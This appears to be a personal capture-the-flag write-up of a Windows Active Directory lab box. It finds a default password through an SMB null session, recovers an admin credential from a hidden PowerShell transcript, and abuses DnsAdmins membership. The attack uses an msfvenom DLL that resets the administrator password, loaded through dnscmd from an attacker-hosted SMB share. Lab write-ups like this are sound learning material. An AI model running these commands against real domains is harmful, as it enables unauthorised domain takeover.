---
Status: In progress
OS: Windows AD
Difficulty: Medium
tags:
  - SMB
  - DLL
  - injection
Date: 2026-07-07T16:11:00
Owned: 2026-07-07T17:56:00
---

---
# Enumeration
## port scan
run rustscan, usual service for windows Ad Kerberos, SMB , LDAP, Winrm
![[Pasted image 20260707161124.png]]

## SMB null Session
![[Pasted image 20260707161353.png]]
found default password for marko in description  
marko:Welcome123!

nxcspray  
![[Pasted image 20260707161521.png]]
not valid  

# melanie
let's check if there is any users that haven't changed the default password  
![[Pasted image 20260707161630.png]]
melanie:Welcome123!

can remote via winrm  
![[Pasted image 20260707161713.png]]
get the user flag  
![[Pasted image 20260707161804.png]]


# Priv esc

![[Pasted image 20260707161925.png]]
can add workstation  

run bloodhound  
![[Pasted image 20260707162049.png]]
no outbound from our owned user, also no shortest path to tier zero/admin  

let's do manual check  
history  
![[Pasted image 20260707162558.png]]
item not found  
cd
![[Pasted image 20260707162622.png]]
service binay  
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
access denied  

scanning for files  
```powershell
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log-File -Recurse -ErrorAction SilentlyContinue
```
nothing interesting only found user.txt  

schtask  
![[Pasted image 20260707163725.png]]
access denied  

from winpeas result  
![[Pasted image 20260707164602.png]]
there is hidden folder for default user  
![[Pasted image 20260707164704.png]]
\Default User -> Access denied  
\All Users  
![[Pasted image 20260707165111.png]]
idk  
![[Pasted image 20260707165415.png]]

nothing in C:\Windows\Tasks either  

## Hidden folder
turnout we need to use `-force` to be able to see hidden folder  
![[Pasted image 20260707171418.png]]
inside PSTranscript there is folder which is also hidden recursively  
![[Pasted image 20260707171534.png]]
remember to add -force to dir command  
idk why can't I download it, Imma just cat it here  
actually we can go around this by put the content to a file first then download  
```sh
cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt > PShistory.txt
```
![[Pasted image 20260707171847.png]]
there is credential in PS history  
`ryan:Serv3r4Admin4cc123!`  

nxcspray the cred  
![[Pasted image 20260707172054.png]]

I have a hunch earlier that we might get to ryan, tried spraying password manually a bit turn out it is in history.  
the reason is that when we enum user earlier  
![[Pasted image 20260707172223.png]]
We can see that the field for Last PW Set is different compare to the rest for melanie, ryan and admin.  

back to our track  
connect as ryan  
![[Pasted image 20260707172751.png]]
found a note  

check priv/groups  
![[Pasted image 20260707172925.png]]
interesting group  
![[Pasted image 20260707172940.png]]
add machine priv  

search file just in case  
```powershell
Get-ChildItem -Path C:\Users\ryan\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```
nothing other than note we found  
![[Pasted image 20260707173146.png]]

I just gonna run bloodhound collector again as ryan  
I know it got something to do with ryan's group  
![[Pasted image 20260707173901.png]]
we need to upload new bloodhound.zip to be able to see the ACL on MicrosoftDNS  
![[Pasted image 20260707174102.png]]


The user ryan is found to be a member of DnsAdmins . Being a member of the DnsAdmins group allows us to use the dnscmd.exe to specify a plugin DLL that should be loaded by the DNS service. Let's create a DLL using msfvenom , that changes the administrator password.
```sh
msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll
```
![[Pasted image 20260707174815.png]]
if we try to upload the file  
![[Pasted image 20260707175111.png]]
it got bonk by Antivirus notice the file size  

we can get by this by hosting file on our smbserver  
```sh
impacket-smbserver share ./
```

then we set the dll for dnscmd by calling da.dll on our machine    
```
cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.12\share\da.dll
```
config the dll then restart dns service using sc.exe  
![[Pasted image 20260707175338.png]]
we can now remote with the new password for admin  
```sh
evil-winrm -i 10.129.96.155 -u administrator -p 'P@s5w0rd123!'
```
![[Pasted image 20260707175524.png]]
get the flag  
![[Pasted image 20260707175619.png]]
